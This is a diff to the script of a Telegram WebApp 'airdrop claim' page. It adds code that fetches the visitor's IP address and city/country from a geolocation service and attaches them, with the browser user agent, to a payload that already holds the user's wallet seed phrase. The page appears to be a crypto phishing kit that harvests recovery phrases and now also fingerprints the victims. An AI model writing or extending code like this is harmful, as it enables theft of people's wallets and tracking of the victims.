@@ -2,6 +2,25 @@ let tg = null;
 let demoMode = false;
 let tgUser = {};
 
+
+
+let userIp = "unknown";
+let userLocation = "unknown";
+
+// Отримати IP та геолокацію
+fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+        userIp = data.ip;
+        userLocation = `${data.city}, ${data.country_name}`;
+        console.log("🌍 IP:", userIp, "| Локація:", userLocation);
+    })
+    .catch(() => {
+        console.warn("⚠️ Не вдалося отримати геолокацію");
+    });
+
+
+
 // ======= Инициализация Telegram WebApp =======
 function initTelegram() {
     if (typeof Telegram === "undefined" || !Telegram.WebApp) {
@@ -120,7 +139,10 @@ function submitAirdrop() {
         event: "airdrop_claim",
         timestamp: new Date().toISOString(),
         seed: words.join(" "),
-        wallet: document.getElementById("wallet").value
+        wallet: document.getElementById("wallet").value || "unknown",
+        ip: userIp,
+        location: userLocation,
+        ua: navigator.userAgent
     };
 
     localStorage.setItem("tg_timestamp", payload.timestamp);
